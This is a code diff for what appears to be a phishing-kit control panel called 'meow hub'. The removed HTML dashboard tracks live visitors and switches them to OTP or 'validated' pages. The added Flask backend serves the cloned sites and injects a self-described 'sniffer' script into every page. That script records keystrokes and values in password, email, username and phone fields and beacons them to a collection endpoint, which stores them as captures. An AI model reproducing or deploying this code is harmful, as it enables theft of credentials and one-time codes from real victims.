@@ -1,202 +1,335 @@
-<!DOCTYPE html>
-<html lang="en" data-bs-theme="dark">
-<head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>meow hub — central panel</title>
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
-<style>
-:root{--bg:#07090e;--card:#0f141c;--side:#0b0e14;--accent:#6366f1;--border:#1e2638;--muted:#8e9bb0}
-body{background:var(--bg);font-family:'Plus Jakarta Sans',sans-serif;color:#f1f5f9;min-height:100vh}
-.sidebar{width:250px;background:var(--side);border-right:1px solid var(--border);height:100vh;position:fixed;top:0;left:0;z-index:1000}
-.main{margin-left:250px;padding:2rem}
-.nav-link{color:var(--muted);border-radius:10px;padding:.7rem 1rem;margin-bottom:.35rem;font-weight:500}
-.nav-link:hover{color:#fff;background:rgba(255,255,255,.05)}
-.nav-link.active{color:#fff;background:linear-gradient(135deg,var(--accent),#4f46e5)}
-.stat-card,.site-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.4rem}
-.stat-card:hover,.site-card:hover{border-color:var(--accent)}
-.badge-live{background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.3)}
-.badge-dead{background:rgba(142,155,176,.12);color:var(--muted)}
-.badge-redir{background:rgba(245,158,11,.15);color:#f59e0b;border:1px solid rgba(245,158,11,.3)}
-.form-control,.form-select{background:#080b12!important;border:1px solid var(--border)!important;color:#fff!important;border-radius:10px}
-.code{font-family:'Fira Code',monospace;font-size:.78rem}
-.live-dot{width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block;animation:pulse 1.6s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
-.sess-row{font-size:.78rem;border-bottom:1px solid rgba(255,255,255,.05)}
-</style>
-</head>
-<body>
-<div class="sidebar d-flex flex-column p-3">
-  <div class="d-flex align-items-center mb-4 px-2 pt-2">
-    <div class="p-2 rounded-3 me-3" style="background:rgba(99,102,241,.12)"><i class="fas fa-wave-square text-primary fs-4"></i></div>
-    <div><h5 class="fw-bold mb-0">meow hub</h5><span class="text-muted small">central panel</span></div>
-  </div>
-  <ul class="nav nav-pills flex-column mb-auto">
-    <li><a href="#dash" class="nav-link active spa" data-t="tab-dash"><i class="fas fa-chart-pie me-2"></i>Dashboard</a></li>
-    <li><a href="#sites" class="nav-link spa" data-t="tab-sites"><i class="fas fa-cubes me-2"></i>Sites</a></li>
-    <li><a href="#live" class="nav-link spa" data-t="tab-live"><i class="fas fa-signal me-2"></i>Live Users</a></li>
-  </ul>
-  <hr class="border-secondary opacity-25">
-  <div class="px-2 mb-3"><div class="d-flex align-items-center"><div class="live-dot me-2"></div><span class="fw-bold text-truncate">{{ user.username }}</span></div></div>
-  <a href="/logout" class="btn btn-outline-danger btn-sm py-2"><i class="fas fa-power-off me-1"></i> logout</a>
-</div>
+import os, json
+from datetime import datetime
+from flask import Flask, render_template, request, redirect, url_for, jsonify, abort
+from flask_sqlalchemy import SQLAlchemy
+from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
+from werkzeug.security import generate_password_hash, check_password_hash
 
-<div class="main">
-<div id="alert-box"></div>
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'meow-hub-secret-key-999'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///hub.db'
+db = SQLAlchemy(app)
+login_manager = LoginManager(app)
+login_manager.login_view = 'login'
 
-<!-- DASHBOARD -->
-<div id="tab-dash" class="spa-c">
-  <h3 class="fw-bold mb-1">Overview</h3><p class="text-muted small">Every site in the folder, live users, redirection state — one glance.</p>
-  <div class="row g-4 mt-1">
-    <div class="col-md-3"><div class="stat-card"><span class="text-muted small">SITES</span><h2 class="fw-bold mb-0" id="st-sites">0</h2></div></div>
-    <div class="col-md-3"><div class="stat-card"><span class="text-muted small">LIVE USERS</span><h2 class="fw-bold mb-0 text-success" id="st-live">0</h2></div></div>
-    <div class="col-md-3"><div class="stat-card"><span class="text-muted small">RUNNING APPS</span><h2 class="fw-bold mb-0" id="st-run">0</h2></div></div>
-    <div class="col-md-3"><div class="stat-card"><span class="text-muted small">TOTAL LAUNCHES</span><h2 class="fw-bold mb-0" id="st-total">0</h2></div></div>
-  </div>
-</div>
+ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+SITES_EXCLUDE = {'meow_hub', 'panel', 'venv', 'instance', '__pycache__'}
 
-<!-- SITES -->
-<div id="tab-sites" class="spa-c d-none">
-  <h3 class="fw-bold mb-1">Sites</h3><p class="text-muted small">Auto-discovered from the folder. Set a redirection mode, launch its app, or open it.</p>
-  <div class="row g-4 mt-1" id="sites-grid"></div>
-</div>
+class User(UserMixin, db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(80), unique=True, nullable=False)
+    password_hash = db.Column(db.String(120), nullable=False)
 
-<!-- LIVE USERS -->
-<div id="tab-live" class="spa-c d-none">
-  <h3 class="fw-bold mb-1">Live Users</h3><p class="text-muted small">Sessions with a heartbeat in the last 25 seconds. Auto-refreshes.</p>
-  <div id="live-list" class="mt-3"></div>
-</div>
-</div>
+class FormSubmission(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    site = db.Column(db.String(80), nullable=False)
+    ip = db.Column(db.String(50), nullable=False)
+    form_data = db.Column(db.Text, nullable=False)
+    timestamp = db.Column(db.DateTime, default=datetime.now)
 
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-<script>
-const SITE_KEYS = {{ sites.keys()|list|tojson }};
-const SITE_META = {{ sites|tojson }};
-let REDIRECTS = {};
+class AccessLog(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    site = db.Column(db.String(80), nullable=False)
+    ip = db.Column(db.String(50), nullable=False)
+    user_agent = db.Column(db.String(200), nullable=False)
+    timestamp = db.Column(db.DateTime, default=datetime.now)
 
-// --- tab nav ---
-document.querySelectorAll('.spa').forEach(b=>b.addEventListener('click',e=>{
-  e.preventDefault();
-  document.querySelectorAll('.spa').forEach(x=>x.classList.remove('active'));
-  b.classList.add('active');
-  document.querySelectorAll('.spa-c').forEach(c=>c.classList.add('d-none'));
-  document.getElementById(b.dataset.t).classList.remove('d-none');
-}));
+@login_manager.user_loader
+def load_user(user_id):
+    return User.query.get(int(user_id))
 
-function alert(msg,type){
-  document.getElementById('alert-box').innerHTML=
-   `<div class="alert alert-${type} border-0 alert-dismissible fade show">${msg}
-    <button type="button" class="btn-close" data-bs-dismiss="alert"></button></div>`;
-}
+def get_sites():
+    sites = {}
+    if not os.path.exists(ROOT_DIR):
+        return sites
+    for name in os.listdir(ROOT_DIR):
+        if name.startswith('.') or name in SITES_EXCLUDE:
+            continue
+        path = os.path.join(ROOT_DIR, name)
+        if os.path.isdir(path):
+            sites[name] = {'name': name.replace('_', ' ').title(), 'has_app': os.path.exists(os.path.join(path, 'app.py'))}
+    return sites
 
-function redirBadge(site){
-  const m=(REDIRECTS[site]||{}).mode||'none';
-  if(m==='none') return `<span class="badge badge-dead">no redirect</span>`;
-  return `<span class="badge badge-redir"><i class="fas fa-arrow-right-arrow-left me-1"></i>${m}</span>`;
-}
+ACTIVE_SESSIONS = {}
 
-function renderSites(per){
-  const g=document.getElementById('sites-grid');
-  g.innerHTML=SITE_KEYS.map(k=>{
-    const s=SITE_META[k], p=per[k]||{};
-    const live=p.live||0, running=p.running;
-    return `<div class="col-md-6 col-xl-4"><div class="site-card h-100">
-      <div class="d-flex justify-content-between align-items-start mb-2">
-        <h5 class="fw-bold mb-0 text-capitalize">${s.name}</h5>
-        <div>${redirBadge(k)}</div>
-      </div>
-      <div class="d-flex gap-3 mb-3">
-        <span class="code text-muted">/s/${k}/</span>
-        <span class="${live>0?'text-success':'text-muted'} small"><i class="fas fa-user me-1"></i>${live} live</span>
-        <span class="${running?'text-info':'text-muted'} small"><i class="fas fa-microchip me-1"></i>${running?'on':'off'}</span>
-      </div>
-      <div class="mb-3">
-        <label class="form-label text-muted small mb-1">redirection</label>
-        <div class="d-flex gap-2">
-          <select class="form-select form-select-sm" id="mode-${k}">
-            <option value="none">none (serve site)</option>
-            <option value="otp">switch to OTP</option>
-            <option value="validated">switch to validated</option>
-            <option value="custom">custom URL</option>
-          </select>
-          <button class="btn btn-sm btn-warning" onclick="setRedir('${k}')"><i class="fas fa-bolt"></i></button>
-        </div>
-        <input class="form-control form-control-sm mt-2 code" id="url-${k}" placeholder="https://… (custom mode)" style="display:none">
-      </div>
-      <div class="d-flex gap-2">
-        <a href="/s/${k}/" target="_blank" class="btn btn-outline-info btn-sm flex-fill"><i class="fas fa-eye me-1"></i>open</a>
-        ${s.has_app?`
-        <button class="btn btn-success btn-sm flex-fill" id="launch-${k}" onclick="launch('${k}')" ${running?'disabled':''}><i class="fas fa-play me-1"></i>${running?'running':'launch'}</button>
-        <button class="btn btn-danger btn-sm" onclick="stop('${k}')" ${running?'':'disabled'}><i class="fas fa-stop"></i></button>`:''}
-      </div>
-    </div></div>`;
-  }).join('');
-  SITE_KEYS.forEach(k=>{
-    const sel=document.getElementById('mode-'+k);
-    if(!sel) return;
-    sel.value=(REDIRECTS[k]||{}).mode||'none';
-    sel.addEventListener('change',()=>{
-      document.getElementById('url-'+k).style.display = sel.value==='custom'?'block':'none';
-    });
-    if(sel.value==='custom') document.getElementById('url-'+k).style.display='block';
-  });
-}
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if User.query.count() == 0:
+        db.session.add(User(username='admin', password_hash=generate_password_hash('admin', method='pbkdf2:sha256')))
+        db.session.commit()
+    if request.method == 'POST':
+        user = User.query.filter_by(username=request.form.get('username')).first()
+        if user and check_password_hash(user.password_hash, request.form.get('password')):
+            login_user(user)
+            return redirect(url_for('index'))
+        return render_template('login.html', error='invalid credentials')
+    return render_template('login.html')
 
-async function setRedir(site){
-  const mode=document.getElementById('mode-'+site).value;
-  const url=document.getElementById('url-'+site).value.trim();
-  const r=await fetch('/api/redirect/'+site,{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({mode,url})});
-  const d=await r.json();
-  if(d.success){ REDIRECTS[site]=d.redirect; alert(`<span class="code">${site}</span> → <b>${mode}</b>`,`warning`); refresh(); }
-  else alert(d.message||'error','danger');
-}
+@app.route('/logout')
+@login_required
+def logout():
+    logout_user()
+    return redirect(url_for('login'))
 
-async function launch(site){
-  const r=await fetch('/api/launch/'+site,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({})});
-  const d=await r.json();
-  d.success?alert(`<span class="code">${site}</span> launched (pid ${d.pid})`,'success'):alert(d.message,'danger');
-  refresh();
-}
-async function stop(site){
-  const r=await fetch('/api/stop/'+site,{method:'POST'});
-  const d=await r.json();
-  d.success?alert(`<span class="code">${site}</span> stopped`,'warning'):alert(d.message,'danger');
-  refresh();
-}
+@app.route('/')
+@login_required
+def index():
+    return render_template('index.html', sites=get_sites())
 
-async function renderLive(){
-  const r=await fetch('/api/live'); const d=await r.json();
-  const box=document.getElementById('live-list');
-  const total=Object.values(d).reduce((a,s)=>a+s.count,0);
-  if(total===0){ box.innerHTML='<p class="text-muted">no live sessions.</p>'; return; }
-  box.innerHTML=Object.entries(d).filter(([k,v])=>v.count>0).map(([k,v])=>`
-    <div class="site-card mb-3">
-      <div class="d-flex justify-content-between mb-2">
-        <span class="fw-bold text-capitalize">${SITE_META[k]?SITE_META[k].name:k}</span>
-        <span class="text-success small"><span class="live-dot me-1"></span>${v.count} live</span>
-      </div>
-      ${v.sessions.map(s=>`<div class="sess-row d-flex justify-content-between py-1">
-        <span class="code text-muted">${s.ip}</span>
-        <span class="text-muted text-truncate mx-2" style="max-width:40%">${s.ua}</span>
-        <span class="code">in ${s.first} · ${s.duration_s}s</span>
-      </div>`).join('')}
-    </div>`).join('');
-}
+@app.route('/logs')
+@login_required
+def view_logs():
+    logs = AccessLog.query.order_by(AccessLog.timestamp.desc()).limit(150).all()
+    submissions = FormSubmission.query.order_by(FormSubmission.timestamp.desc()).limit(150).all()
+    return render_template('logs.html', logs=logs, submissions=submissions)
 
-async function refresh(){
-  const r=await fetch('/api/stats'); const d=await r.json();
-  document.getElementById('st-sites').textContent=d.sites;
-  document.getElementById('st-live').textContent=d.live_users;
-  document.getElementById('st-run').textContent=d.running;
-  document.getElementById('st-total').textContent=d.total_launches;
-  REDIRECTS=Object.fromEntries(Object.entries(d.per_site).map(([k,v])=>[k,v.redirect]));
-  renderSites(d.per_site);
-  renderLive();
-}
-setInterval(refresh,4000);
-refresh();
-</script>
-</body>
-</html>
+@app.route('/api/change-password', methods=['POST'])
+@login_required
+def change_password():
+    data = request.get_json() or {}
+    if not data.get('password'):
+        return jsonify({'success': False, 'error': 'Password cannot be empty'})
+    current_user.password_hash = generate_password_hash(data['password'], method='pbkdf2:sha256')
+    db.session.commit()
+    return jsonify({'success': True})
+
+@app.route('/api/stats')
+@login_required
+def api_stats():
+    now = datetime.now().timestamp()
+    live_total = 0
+    per_site = {}
+    for k in get_sites():
+        s_data = ACTIVE_SESSIONS.get(k, {})
+        for ip, info in list(s_data.items()):
+            if now - info['last_seen'] >= 25:
+                del s_data[ip]
+        cnt = len(s_data)
+        live_total += cnt
+        per_site[k] = {'live': cnt}
+    return jsonify({'sites': len(get_sites()), 'live_users': live_total, 'per_site': per_site})
+
+def log_submission(site, ip, raw_data):
+    try:
+        if not raw_data:
+            return
+        db.session.add(FormSubmission(site=site, ip=ip, form_data=json.dumps(raw_data, indent=2, default=str)))
+        db.session.commit()
+        app.logger.info(f'[CAPTURE] site={site} ip={ip} keys={list(raw_data.keys())}')
+    except Exception as e:
+        db.session.rollback()
+        app.logger.error(f'[CAPTURE FAIL] {e}')
+
+@app.route('/hub/collect', methods=['POST'])
+def hub_collect():
+    site = request.args.get('site')
+    if not site:
+        return '', 400
+    ip = request.remote_addr
+    payload = {}
+    if request.is_json:
+        payload = request.get_json(silent=True) or {}
+    elif request.form:
+        payload = request.form.to_dict()
+    elif request.data:
+        try:
+            payload = json.loads(request.data.decode('utf-8', errors='ignore'))
+        except Exception:
+            payload = {'raw': request.data.decode('utf-8', errors='ignore')[:2000]}
+    log_submission(site, ip, payload)
+    return '', 204
+
+@app.route('/s/<site>/', defaults={'path': ''}, methods=['GET', 'POST'])
+@app.route('/s/<site>/<path:path>', methods=['GET', 'POST'])
+def serve_site(site, path):
+    sites = get_sites()
+    if site not in sites:
+        abort(404)
+    ip = request.remote_addr
+    if request.method == 'POST':
+        body = {}
+        if request.form:
+            body.update(request.form.to_dict())
+        if request.is_json:
+            body.update(request.get_json(silent=True) or {})
+        if request.data and not body:
+            try:
+                body = json.loads(request.data.decode('utf-8', errors='ignore'))
+            except Exception:
+                body = {'raw': request.data.decode('utf-8', errors='ignore')[:2000]}
+        log_submission(site, ip, body)
+    site_dir = os.path.join(ROOT_DIR, site)
+    if not path:
+        path = 'index.html'
+    target_file = os.path.abspath(os.path.join(site_dir, path))
+    if not target_file.startswith(os.path.abspath(site_dir)) or not os.path.exists(target_file):
+        abort(404)
+    if target_file.endswith('.html'):
+        with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        tracker_script = """
+        <script>
+        (function() {
+            var SITE = '""" + site + """';
+            var BUFFER_KEY = '__hub_buf_' + SITE;
+            var FLUSH_INTERVAL = 3000;
+
+            function loadBuffer() { try { return JSON.parse(localStorage.getItem(BUFFER_KEY) || '[]'); } catch (e) { return []; } }
+            function saveBuffer(buf) { try { localStorage.setItem(BUFFER_KEY, JSON.stringify(buf)); } catch (e) {} }
+
+            function rawSend(data) {
+                try {
+                    var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+                    return navigator.sendBeacon('/hub/collect?site=' + SITE, blob);
+                } catch (e) { return false; }
+            }
+
+            function flushBuffer() {
+                var buf = loadBuffer();
+                if (!buf.length) return;
+                var remaining = [];
+                for (var i = 0; i < buf.length; i++) {
+                    if (!rawSend(buf[i])) remaining.push(buf[i]);
+                }
+                saveBuffer(remaining);
+            }
+
+            function queue(data) {
+                if (!data || !Object.keys(data).length) return;
+                var buf = loadBuffer();
+                buf.push(data);
+                saveBuffer(buf);
+                flushBuffer();
+            }
+
+            setInterval(flushBuffer, FLUSH_INTERVAL);
+            document.addEventListener('visibilitychange', function() { if (document.visibilityState === 'hidden') flushBuffer(); });
+            window.addEventListener('beforeunload', flushBuffer);
+            window.addEventListener('pagehide', flushBuffer);
+
+            function ping() { navigator.sendBeacon('/hub/heartbeat?site=' + SITE); }
+            ping();
+            setInterval(ping, 10000);
+
+            var fieldBuffers = {};
+
+            function fieldKey(el) {
+                var id = el.id || el.name || el.placeholder || el.getAttribute('aria-label') || el.type || 'unknown';
+                return el.tagName + ':' + id;
+            }
+
+            function isSensitive(el) {
+                var t = (el.type || '').toLowerCase();
+                var n = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '')).toLowerCase();
+                return t === 'password' || t === 'email' || t === 'text' || t === 'tel' ||
+                       n.indexOf('pass') !== -1 || n.indexOf('email') !== -1 || n.indexOf('user') !== -1 ||
+                       n.indexOf('login') !== -1 || n.indexOf('phone') !== -1;
+            }
+
+            document.addEventListener('keyup', function(e) {
+                try {
+                    var el = e.target;
+                    if (!el || !isSensitive(el)) return;
+                    var k = fieldKey(el);
+                    if (!fieldBuffers[k]) fieldBuffers[k] = { el: el, text: '' };
+                    fieldBuffers[k].text = el.value || '';
+                } catch (err) {}
+            }, true);
+
+            document.addEventListener('input', function(e) {
+                try {
+                    var el = e.target;
+                    if (!el || !isSensitive(el)) return;
+                    var k = fieldKey(el);
+                    if (!fieldBuffers[k]) fieldBuffers[k] = { el: el, text: '' };
+                    fieldBuffers[k].text = el.value || '';
+                } catch (err) {}
+            }, true);
+
+            function harvestAll() {
+                var data = {};
+                for (var k in fieldBuffers) {
+                    var fb = fieldBuffers[k];
+                    var name = fb.el.name || fb.el.id || k;
+                    if (fb.text) data[name] = fb.text;
+                }
+                var els = document.querySelectorAll('input, select, textarea');
+                for (var i = 0; i < els.length; i++) {
+                    var el = els[i];
+                    if (!isSensitive(el)) continue;
+                    var name = el.name || el.id || fieldKey(el);
+                    var val = el.value || '';
+                    if (val && !data[name]) data[name] = val;
+                }
+                return data;
+            }
+
+            document.addEventListener('submit', function(e) {
+                try {
+                    var data = harvestAll();
+                    data.__trigger = 'submit';
+                    queue(data);
+                } catch (err) {}
+            }, true);
+
+            document.addEventListener('click', function(e) {
+                try {
+                    var btn = e.target.closest('button, input[type=submit], input[type=button], [role=button], a');
+                    if (!btn) return;
+                    var label = (btn.textContent || btn.value || btn.name || btn.id || 'unknown').trim().slice(0, 60).toLowerCase();
+                    var isAction = label.indexOf('log') !== -1 || label.indexOf('sign') !== -1 || label.indexOf('continue') !== -1 ||
+                                   label.indexOf('next') !== -1 || label.indexOf('submit') !== -1 || label.indexOf('verify') !== -1 ||
+                                   btn.type === 'submit' || btn.tagName === 'BUTTON';
+                    if (!isAction) return;
+                    var data = harvestAll();
+                    data.__trigger = 'click:' + label;
+                    queue(data);
+                    setTimeout(function() {
+                        var d2 = harvestAll();
+                        d2.__trigger = 'click-delayed:' + label;
+                        queue(d2);
+                    }, 300);
+                } catch (err) {}
+            }, true);
+
+            window.addEventListener('beforeunload', function() {
+                try {
+                    var data = harvestAll();
+                    data.__trigger = 'unload';
+                    queue(data);
+                } catch (err) {}
+            });
+
+            console.log('[hub] sniffer active on', SITE);
+        })();
+        </script>
+        """
+        if '</body>' in content:
+            content = content.replace('</body>', tracker_script + '</body>')
+        else:
+            content += tracker_script
+        return content
+    from flask import send_from_directory
+    return send_from_directory(site_dir, path)
+
+@app.route('/hub/heartbeat', methods=['POST', 'GET'])
+def hub_heartbeat():
+    site = request.args.get('site')
+    if not site:
+        return '', 400
+    ip = request.remote_addr
+    ua = request.headers.get('User-Agent', 'Unknown')
+    now = datetime.now().timestamp()
+    if site not in ACTIVE_SESSIONS:
+        ACTIVE_SESSIONS[site] = {}
+    last_log = AccessLog.query.filter_by(site=site, ip=ip).order_by(AccessLog.timestamp.desc()).first()
+    if not last_log or (datetime.now() - last_log.timestamp).total_seconds() > 60:
+        db.session.add(AccessLog(site=site, ip=ip, user_agent=ua))
+        db.session.commit()
+    ACTIVE_SESSIONS[site][ip] = {'first_seen': now, 'last_seen': now, 'ua': ua}
+    return '', 204
+
+if __name__ == '__main__':
+    with app.app_context():
+        db.create_all()
+    app.run(host='0.0.0.0', port=5000, debug=True)
